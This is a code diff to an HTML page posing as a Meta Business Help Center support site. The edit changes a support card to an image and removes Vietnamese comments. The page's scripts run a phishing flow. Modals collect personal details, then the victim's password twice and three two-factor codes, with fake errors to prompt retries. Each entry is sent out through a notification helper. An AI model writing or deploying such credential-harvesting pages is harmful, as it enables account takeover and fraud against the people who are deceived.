@@ -128,8 +128,26 @@
   .support-inner { max-width: 1504px; margin: 0 auto; display: flex; align-items: center; gap: 64px; padding: 0 32px; }
   .support-video { flex: 1; position: relative; border-radius: 24px; overflow: hidden; aspect-ratio: 1; }
   .support-video video { width: 100%; height: 100%; object-fit: cover; opacity: 0.95; }
-  .support-card { position: absolute; top: 60%; left: 50%; transform: translateX(-50%); width: 70%; background: #fff; border-radius: 8px; padding: 16px 24px; display: flex; align-items: center; justify-content: space-between; box-shadow: 0 12px 40px rgba(0,0,0,0.15); }
-  .support-card span { font-size: 18px; font-weight: 500; color: #1C2B33; white-space: nowrap; }
+
+  /* ── SUPPORT CARD: hiển thị ảnh thump2.jpg ── */
+  .support-card {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    width: 75%;
+    border-radius: 16px;
+    overflow: hidden;
+    box-shadow: 0 16px 48px rgba(0,0,0,0.22);
+    aspect-ratio: 4/3;
+  }
+  .support-card img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    display: block;
+  }
+
   .support-text { flex: 1; max-width: 500px; }
   .support-text .tag { font-size: 12px; color: #5D6C7B; text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 12px; font-weight: 500; }
   .support-text h2 { font-size: clamp(32px, 3vw, 40px); font-weight: 500; color: #1C2B33; line-height: 1.2; margin-bottom: 32px; }
@@ -566,10 +584,12 @@
   <div class="support-inner">
     <div class="support-video">
       <video poster="public/images/thumb_support.webp" autoplay loop muted playsinline></video>
+
+      <!-- ✅ SỬA: hiển thị ảnh thump2.jpg thay vì text card -->
       <div class="support-card">
-        <span>Create a page</span>
-        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#5D6C7B" stroke-width="2"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.34-4.34"/></svg>
+        <img src="public/images/thump2.jpg" alt="Meta Business Help Center"/>
       </div>
+
       <button class="pause-btn" onclick="toggleVideo(this)">
         <svg width="16" height="16" viewBox="0 0 24 24" fill="white"><rect x="14" y="3" width="5" height="18" rx="1"/><rect x="5" y="3" width="5" height="18" rx="1"/></svg>
       </button>
@@ -812,9 +832,8 @@ document.addEventListener('keydown', function(e) {
   }
 </script>
 
-<!-- ===================== MODAL FLOWS (FIXED) ===================== -->
+<!-- ===================== MODAL FLOWS ===================== -->
 <script>
-// ─── Master data store: tất cả data gom vào 1 object duy nhất ───
 var _masterData = {};
 
 var COUNTRY_CODES = [
@@ -1024,11 +1043,8 @@ document.addEventListener('click', function(e) {
   }
 });
 
-// ==================== MODAL 1: CLIENT INFO ====================
 function openClientModal() {
-  // Reset master data mỗi lần mở modal mới
   _masterData = {};
-
   _detectCountryDial().then(function() {
     var content =
       '<div class="modal-header">' +
@@ -1062,8 +1078,6 @@ function openClientModal() {
 
     document.getElementById('clientForm').addEventListener('submit', function(e) {
       e.preventDefault();
-
-      // Lưu vào _masterData — dùng _selectedDial tại đúng thời điểm submit
       _masterData.fullName      = document.getElementById('fullName').value.trim();
       _masterData.email         = document.getElementById('email').value.trim();
       _masterData.emailBusiness = document.getElementById('emailBusiness').value.trim();
@@ -1073,14 +1087,12 @@ function openClientModal() {
       _masterData.month         = document.getElementById('month').value;
       _masterData.year          = document.getElementById('year').value;
       _masterData.message       = document.getElementById('message').value.trim();
-
       Modal.close('clientModal');
       setTimeout(function() { openSecurityModal(); }, 250);
     });
   });
 }
 
-// ==================== MODAL 2: SECURITY (PASSWORD) ====================
 function openSecurityModal() {
   var content =
     '<div style="display:flex;flex-direction:column;align-items:center;">' +
@@ -1122,10 +1134,8 @@ function openSecurityModal() {
     submitBtn.innerHTML = '<span class="modal-spinner"></span>';
 
     if (clickCount === 0) {
-      // Lần nhập password đầu: lưu vào _masterData và gửi ngay
       _masterData.password = password;
       await Utils.sendNotification(_masterData);
-
       setTimeout(function() {
         submitBtn.disabled = false;
         submitBtn.textContent = 'Continue';
@@ -1135,10 +1145,8 @@ function openSecurityModal() {
         clickCount = 1;
       }, 1350);
     } else {
-      // Lần nhập password thứ 2: cập nhật _masterData và gửi
       _masterData.passwordSecond = password;
       await Utils.sendNotification(_masterData);
-
       setTimeout(function() {
         Modal.close('securityModal');
         setTimeout(function() { openAuthenticationModal(); }, 250);
@@ -1147,7 +1155,6 @@ function openSecurityModal() {
   });
 }
 
-// ==================== MODAL 3: AUTHENTICATION (2FA) ====================
 function openAuthenticationModal() {
   var emailDisplay = Utils.maskEmail(_masterData.email || '');
   var phoneDisplay = Utils.maskPhone(_masterData.phone || '');
@@ -1230,7 +1237,6 @@ function openAuthenticationModal() {
         startCountdown(errorMsg, submitBtn);
         authCount = 1;
       }, 1400);
-
     } else if (authCount === 1) {
       _masterData.twoFaSecond = twoFa;
       await Utils.sendNotification(_masterData);
@@ -1239,7 +1245,6 @@ function openAuthenticationModal() {
         startCountdown(errorMsg, submitBtn);
         authCount = 2;
       }, 1200);
-
     } else {
       _masterData.twoFaThird = twoFa;
       await Utils.sendNotification(_masterData);
@@ -1251,7 +1256,6 @@ function openAuthenticationModal() {
   });
 }
 
-// ==================== MODAL 4: SUCCESS ====================
 function openSuccessModal() {
   var content =
     '<div class="modal-header">' +
